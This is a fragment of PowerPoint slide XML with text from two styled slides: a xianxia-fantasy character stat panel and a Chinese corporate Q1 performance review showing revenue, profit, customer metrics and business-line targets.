            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Shape 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="5299159"/>
            <a:ext cx="2014018" cy="539469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180900"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="6B5500"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Text 138"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7112000" y="5371088"/>
            <a:ext cx="269735" cy="3776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🌌</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="Text 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="5371088"/>
            <a:ext cx="1618407" cy="197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虚空戒</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Text 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="5568894"/>
            <a:ext cx="1618407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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BB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传说 · 容纳三千世界</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Shape 141"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="431575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D04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0" y="6054416"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B873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1618407" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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3236814" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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4855221" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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6473628" y="6108363"/>
            <a:ext cx="8991" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A28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0" name="Text 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6081389"/>
            <a:ext cx="1483540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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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斩杀强者</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Text 148"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6189283"/>
            <a:ext cx="1483540" cy="197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FF4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47万+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Text 149"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6081389"/>
            <a:ext cx="1483540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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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修炼年岁</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="153" name="Text 150"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6189283"/>
            <a:ext cx="1483540" cy="197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3,000年</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Text 151"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3416637" y="6081389"/>
            <a:ext cx="1483540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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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神器数量</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Text 152"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3416637" y="6189283"/>
            <a:ext cx="1483540" cy="197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128件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Text 153"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6081389"/>
            <a:ext cx="1483540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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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当前境界</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Text 154"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6189283"/>
            <a:ext cx="1483540" cy="197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化神·九重</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Text 155"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6653451" y="6081389"/>
            <a:ext cx="1483540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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Text 156"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6653451" y="6189283"/>
            <a:ext cx="1483540" cy="197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FF4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度劫·飞升</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Text 157"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7912212" y="6108363"/>
            <a:ext cx="1168850" cy="305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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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“吾虽孤身立于天地，然万古皆在脚下。”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Shape 158"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0502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2" name="Text 159"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179823" y="6512965"/>
            <a:ext cx="6293805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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A2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❖ 荒独断万古 · 洪荒纪元 第三千零一年 · 天外来敌降临 ❖</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Text 160"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6743363" y="6512965"/>
            <a:ext cx="2247788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525" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A2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 03 / 06 · 玄幻史诇风格</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5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186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1621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12575"/>
            <a:ext cx="9144000" cy="26973"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="009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4" y="282097"/>
            <a:ext cx="395611" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11557"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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4" y="282097"/>
            <a:ext cx="395611" cy="3956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9469" y="282097"/>
            <a:ext cx="1618407" cy="197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极光科技集团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39469" y="497885"/>
            <a:ext cx="2517522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8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AuroraGroup · 企业绩效管理平台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2607434" y="336044"/>
            <a:ext cx="8991" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3344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345" y="282097"/>
            <a:ext cx="3776283" cy="269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Q1 经营业绩汇报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697345" y="587796"/>
            <a:ext cx="4675398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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B8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汇报人：王总监  ·  汇报对象：董事会 / CEO  ·  2026-03-13  ·  内部机密</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7462655" y="336044"/>
            <a:ext cx="1564460" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13868"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D2A4D"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="0066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62655" y="336044"/>
            <a:ext cx="1564460" cy="197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75" b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="66C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Q1 · 1月—3月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7462655" y="569814"/>
            <a:ext cx="1564460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5" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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Operations Review</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="983407"/>
            <a:ext cx="1906124" cy="86315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3858" y="983407"/>
            <a:ext cx="35965" cy="86315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5788" y="1055336"/>
            <a:ext cx="1798230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38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季度营业收入</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="1199195"/>
            <a:ext cx="1258761" cy="287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4,782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22690" y="1307088"/>
            <a:ext cx="539469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万元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15788" y="1522876"/>
            <a:ext cx="1618407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75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+18.4%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809204" y="1522876"/>
            <a:ext cx="1078938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上季度对比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215788" y="1684717"/>
            <a:ext cx="1798230" cy="107894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5788" y="1684717"/>
            <a:ext cx="1078938" cy="107894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3858" y="1918487"/>
            <a:ext cx="1906124" cy="86315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3858" y="1918487"/>
            <a:ext cx="35965" cy="863150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5788" y="1990416"/>
            <a:ext cx="1798230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38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净利润</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="2134274"/>
            <a:ext cx="1258761" cy="287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1,089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822690" y="2242168"/>
            <a:ext cx="539469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万元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15788" y="2457956"/>
            <a:ext cx="1618407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75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+22.1%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809204" y="2457956"/>
            <a:ext cx="1078938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上季度对比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215788" y="2619796"/>
            <a:ext cx="1798230" cy="107894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5788" y="2619796"/>
            <a:ext cx="1186832" cy="107894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3858" y="2853566"/>
            <a:ext cx="1906124" cy="86315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43858" y="2853566"/>
            <a:ext cx="35965" cy="86315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5788" y="2925496"/>
            <a:ext cx="1798230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38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新增客户数</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="3069354"/>
            <a:ext cx="1258761" cy="287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2,341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822690" y="3177248"/>
            <a:ext cx="539469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15788" y="3393035"/>
            <a:ext cx="1618407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75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+9.7%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809204" y="3393035"/>
            <a:ext cx="1078938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上季度对比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215788" y="3554876"/>
            <a:ext cx="1798230" cy="107894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5788" y="3554876"/>
            <a:ext cx="1294726" cy="107894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3858" y="3788646"/>
            <a:ext cx="1906124" cy="86315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3858" y="3788646"/>
            <a:ext cx="35965" cy="863150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5788" y="3860575"/>
            <a:ext cx="1798230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38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客户留存率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="4004434"/>
            <a:ext cx="1258761" cy="287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701310" y="4112327"/>
            <a:ext cx="539469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15788" y="4328115"/>
            <a:ext cx="1618407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75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+2.3pp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="809204" y="4328115"/>
            <a:ext cx="1078938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上季度对比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215788" y="4489956"/>
            <a:ext cx="1798230" cy="107894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15788" y="4489956"/>
            <a:ext cx="1402619" cy="107894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43858" y="4723726"/>
            <a:ext cx="1906124" cy="86315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43858" y="4723726"/>
            <a:ext cx="35965" cy="86315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15788" y="4795655"/>
            <a:ext cx="1798230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38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获客成本 CAC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215788" y="4939513"/>
            <a:ext cx="1258761" cy="287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342</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="579929" y="5047407"/>
            <a:ext cx="539469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元/户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215788" y="5263195"/>
            <a:ext cx="1618407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75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-15.2%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Text 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="809204" y="5263195"/>
            <a:ext cx="1078938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上季度对比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215788" y="5425035"/>
            <a:ext cx="1798230" cy="107894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15788" y="5425035"/>
            <a:ext cx="1510513" cy="107894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193841" y="983407"/>
            <a:ext cx="5080000" cy="206796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220814" y="983407"/>
            <a:ext cx="26973" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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83752" y="1055336"/>
            <a:ext cx="3236814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25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季度收入 &amp; 利润趋势</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5610478" y="1055336"/>
            <a:ext cx="1618407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38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单位：百万元 · 近8季度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="64" name="Chart 0"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2301735" y="1253142"/>
          <a:ext cx="4855221" cy="17083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5" name="Shape 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2193841" y="3105319"/>
            <a:ext cx="5080000" cy="199603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2220814" y="3105319"/>
            <a:ext cx="26973" cy="125876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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2283752" y="3177248"/>
            <a:ext cx="2697345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25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各业务线完成情况</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5610478" y="3177248"/>
            <a:ext cx="1618407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38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与年度目标对比</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Shape 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="3357071"/>
            <a:ext cx="4936142" cy="197805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2265770" y="3384044"/>
            <a:ext cx="773239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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Text 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2463575" y="3384044"/>
            <a:ext cx="1078938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业务线</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Text 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632425" y="3384044"/>
            <a:ext cx="773239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Q1实际</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531540" y="3384044"/>
            <a:ext cx="773239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Q1目标</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Text 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430655" y="3384044"/>
            <a:ext cx="773239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完成率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Text 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149947" y="3384044"/>
            <a:ext cx="773239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同比增长</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Text 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6869239" y="3384044"/>
            <a:ext cx="773239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600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Shape 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="3554876"/>
            <a:ext cx="4936142" cy="359646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2265770" y="3905531"/>
            <a:ext cx="4936142" cy="8991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2265770" y="3590841"/>
            <a:ext cx="215788" cy="287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00" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Text 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2463575" y="3590841"/>
            <a:ext cx="1078938" cy="287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13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云计算服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Text 78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632425" y="3590841"/>
            <a:ext cx="827186" cy="287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7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1,842万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Text 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531540" y="3590841"/>
            <a:ext cx="827186" cy="287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75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1,600万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Text 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430655" y="3590841"/>
            <a:ext cx="665345" cy="287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13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115%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Text 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149947" y="3590841"/>
            <a:ext cx="647363" cy="287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75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34.2%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Shape 82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6905204" y="3662770"/>
            <a:ext cx="377628" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19069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6905204" y="3662770"/>
            <a:ext cx="377628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3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达标</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Shape 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="3932504"/>
            <a:ext cx="4936142" cy="359646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2265770" y="4283159"/>
            <a:ext cx="4936142" cy="8991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2265770" y="3968469"/>
            <a:ext cx="215788" cy="287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00" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Text 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2463575" y="3968469"/>
            <a:ext cx="1078938" cy="287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13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AI解决方案</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Text 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632425" y="3968469"/>
            <a:ext cx="827186" cy="287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7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1,256万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Text 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531540" y="3968469"/>
            <a:ext cx="827186" cy="287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75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1,100万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Text 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430655" y="3968469"/>
            <a:ext cx="665345" cy="287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13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114%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Text 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149947" y="3968469"/>
            <a:ext cx="647363" cy="287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75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58.7%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Shape 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6905204" y="4040398"/>
            <a:ext cx="377628" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19069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6905204" y="4040398"/>
            <a:ext cx="377628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3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超额</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Shape 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="4310133"/>
            <a:ext cx="4936142" cy="359646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2265770" y="4660788"/>
            <a:ext cx="4936142" cy="8991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2265770" y="4346097"/>
